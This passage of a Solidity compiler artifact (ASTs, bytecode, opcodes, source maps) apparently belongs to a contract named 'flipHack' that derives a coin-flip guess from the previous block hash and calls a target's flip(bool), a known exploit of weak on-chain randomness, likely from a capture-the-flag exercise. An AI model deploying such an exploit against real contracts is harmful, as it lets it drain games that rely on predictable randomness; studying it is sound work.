									"returnSlots": 1
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 310,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 271,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:937:1",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:1",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "109:92:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "119:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "131:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "142:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "127:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "127:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "119:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "161:9:1"
																	},
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "value0",
																						"nodeType": "YulIdentifier",
																						"src": "186:6:1"
																					}
																				],
																				"functionName": {
																					"name": "iszero",
																					"nodeType": "YulIdentifier",
																					"src": "179:6:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "179:14:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "172:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "172:22:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "154:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "154:41:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "154:41:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "78:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "89:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "100:4:1",
														"type": ""
													}
												],
												"src": "14:187:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "255:176:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "265:17:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "277:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "280:1:1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "273:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "273:9:1"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "265:4:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "314:111:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "335:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"arguments": [
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "342:3:1",
																							"type": "",
																							"value": "224"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "347:10:1",
																							"type": "",
																							"value": "0x4e487b71"
																						}
																					],
																					"functionName": {
																						"name": "shl",
																						"nodeType": "YulIdentifier",
																						"src": "338:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "338:20:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "328:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "328:31:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "328:31:1"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "379:1:1",
																					"type": "",
																					"value": "4"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "382:4:1",
																					"type": "",
																					"value": "0x11"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "372:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "372:15:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "372:15:1"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "407:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "410:4:1",
																					"type": "",
																					"value": "0x24"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "400:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "400:15:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "400:15:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "diff",
																		"nodeType": "YulIdentifier",
																		"src": "297:4:1"
																	},
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "303:1:1"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "294:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "294:11:1"
															},
															"nodeType": "YulIf",
															"src": "291:134:1"
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "237:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "240:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "246:4:1",
														"type": ""
													}
												],
												"src": "206:225:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "482:171:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "513:111:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "534:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"arguments": [
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "541:3:1",
																							"type": "",
																							"value": "224"
																						},
																						{
																							"kind": "number",
																							"nodeType": "YulLiteral",
																							"src": "546:10:1",
																							"type": "",
																							"value": "0x4e487b71"
																						}
																					],
																					"functionName": {
																						"name": "shl",
																						"nodeType": "YulIdentifier",
																						"src": "537:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "537:20:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "527:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "527:31:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "527:31:1"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "578:1:1",
																					"type": "",
																					"value": "4"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "581:4:1",
																					"type": "",
																					"value": "0x12"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "571:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "571:15:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "571:15:1"
																	},
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "606:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "609:4:1",
																					"type": "",
																					"value": "0x24"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "599:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "599:15:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "599:15:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "502:1:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "495:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "495:9:1"
															},
															"nodeType": "YulIf",
															"src": "492:132:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "633:14:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "642:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "645:1:1"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "638:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "638:9:1"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "633:1:1"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "467:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "470:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "476:1:1",
														"type": ""
													}
												],
												"src": "436:217:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "736:199:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "782:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "791:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "794:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "784:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "784:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "784:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "757:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "766:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "753:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "753:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "778:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "749:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "749:32:1"
															},
															"nodeType": "YulIf",
															"src": "746:52:1"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "807:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "826:9:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "820:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "820:16:1"
															},
															"variables": [
																{
																	"name": "value",
																	"nodeType": "YulTypedName",
																	"src": "811:5:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "889:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "898:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "901:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "891:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "891:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "891:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "858:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"name": "value",
																								"nodeType": "YulIdentifier",
																								"src": "879:5:1"
																							}
																						],
																						"functionName": {
																							"name": "iszero",
																							"nodeType": "YulIdentifier",
																							"src": "872:6:1"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "872:13:1"
																					}
																				],
																				"functionName": {
																					"name": "iszero",
																					"nodeType": "YulIdentifier",
																					"src": "865:6:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "865:21:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "855:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "855:32:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "848:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "848:40:1"
															},
															"nodeType": "YulIf",
															"src": "845:60:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "914:15:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "924:5:1"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "914:6:1"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "702:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "713:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "725:6:1",
														"type": ""
													}
												],
												"src": "658:277:1"
											}
										]
									},
									"contents": "{\n    { }\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart, value0) -> tail\n    {\n        tail := add(headStart, 32)\n        mstore(headStart, iszero(iszero(value0)))\n    }\n    function checked_sub_t_uint256(x, y) -> diff\n    {\n        diff := sub(x, y)\n        if gt(diff, x)\n        {\n            mstore(0, shl(224, 0x4e487b71))\n            mstore(4, 0x11)\n            revert(0, 0x24)\n        }\n    }\n    function checked_div_t_uint256(x, y) -> r\n    {\n        if iszero(y)\n        {\n            mstore(0, shl(224, 0x4e487b71))\n            mstore(4, 0x12)\n            revert(0, 0x24)\n        }\n        r := div(x, y)\n    }\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        let value := mload(headStart)\n        if iszero(eq(value, iszero(iszero(value)))) { revert(0, 0) }\n        value0 := value\n    }\n}",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cb80c04414610030575b600080fd5b61003861004c565b604051901515815260200160405180910390f35b60008061005a60014361010f565b4060001c9050806000540361006e57600080fd5b60008181556001546100809083610136565b9050600081600114610093576000610096565b60015b600254604051631d263f6760e01b815282151560048201529192506001600160a01b031690631d263f67906024016020604051808303816000875af11580156100e3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101079190610158565b935050505090565b8181038181111561013057634e487b7160e01b600052601160045260246000fd5b92915050565b60008261015357634e487b7160e01b600052601260045260246000fd5b500490565b60006020828403121561016a57600080fd5b8151801515811461017a57600080fd5b939250505056fea2646970667358221220a1b2bdeac39cf64cb37fc77ae4da0b6b79487347dd5ad7c15ecc72ff72ca47ba64736f6c63430008120033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCB80C044 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4C JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x5A PUSH1 0x1 NUMBER PUSH2 0x10F JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x0 SLOAD SUB PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 DUP2 SSTORE PUSH1 0x1 SLOAD PUSH2 0x80 SWAP1 DUP4 PUSH2 0x136 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 PUSH1 0x1 EQ PUSH2 0x93 JUMPI PUSH1 0x0 PUSH2 0x96 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x1D263F67 PUSH1 0xE0 SHL DUP2 MSTORE DUP3 ISZERO ISZERO PUSH1 0x4 DUP3 ADD MSTORE SWAP2 SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x1D263F67 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x107 SWAP2 SWAP1 PUSH2 0x158 JUMP JUMPDEST SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST DUP2 DUP2 SUB DUP2 DUP2 GT ISZERO PUSH2 0x130 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x153 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x16A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x17A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 0xB2 0xBD 0xEA 0xC3 SWAP13 0xF6 0x4C 0xB3 PUSH32 0xC77AE4DA0B6B79487347DD5AD7C15ECC72FF72CA47BA64736F6C634300081200 CALLER ",
							"sourceMap": "140:625:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;418:345;;;:::i;:::-;;;179:14:1;;172:22;154:41;;142:2;127:18;418:345:0;;;;;;;;455:4;;509:16;524:1;509:12;:16;:::i;:::-;499:27;491:36;;470:57;;554:10;542:8;;:22;538:61;;580:8;;;538:61;605:8;:21;;;664:6;;651:19;;616:10;651:19;:::i;:::-;632:38;;676:9;688:8;700:1;688:13;:28;;711:5;688:28;;;704:4;688:28;729:16;;:27;;-1:-1:-1;;;729:27:0;;179:14:1;;172:22;729:27:0;;;154:41:1;676:40:0;;-1:-1:-1;;;;;;729:16:0;;:21;;127:18:1;;729:27:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;722:34;;;;;418:345;:::o;206:225:1:-;273:9;;;294:11;;;291:134;;;347:10;342:3;338:20;335:1;328:31;382:4;379:1;372:15;410:4;407:1;400:15;291:134;206:225;;;;:::o;436:217::-;476:1;502;492:132;;546:10;541:3;537:20;534:1;527:31;581:4;578:1;571:15;609:4;606:1;599:15;492:132;-1:-1:-1;638:9:1;;436:217::o;658:277::-;725:6;778:2;766:9;757:7;753:23;749:32;746:52;;;794:1;791;784:12;746:52;826:9;820:16;879:5;872:13;865:21;858:5;855:32;845:60;;901:1;898;891:12;845:60;924:5;658:277;-1:-1:-1;;;658:277:1:o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "87800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"flipHack()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 140,
									"end": 765,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 140,
									"end": 765,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 140,
									"end": 765,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "FF"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": 192,
									"end": 286,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 192,
									"end": 286,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 325,
									"end": 412,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 325,
									"end": 412,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 325,
									"end": 412,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 325,
									"end": 412,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 325,
									"end": 412,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 325,
									"end": 412,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 325,
									"end": 412,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 325,
									"end": 412,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 325,
									"end": 412,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 367,
									"end": 383,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 367,
									"end": 405,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT",
									"source": -1
								},
								{
									"begin": 367,
									"end": 405,
									"name": "AND",
									"source": 0
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 367,
									"end": 405,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 140,
									"end": 765,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 140,
									"end": 765,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 14,
									"end": 304,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 14,
									"end": 304,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 84,
									"end": 90,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 137,
									"end": 139,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 125,
									"end": 134,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 116,
									"end": 123,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 112,
									"end": 135,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 108,
									"end": 140,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 105,
									"end": 157,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 105,
									"end": 157,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 105,
									"end": 157,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 153,
									"end": 154,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 150,
									"end": 151,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 143,
									"end": 155,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 105,
									"end": 157,
									"name": "tag",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 105,
									"end": 157,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 179,
									"end": 195,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 179,
									"end": 195,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
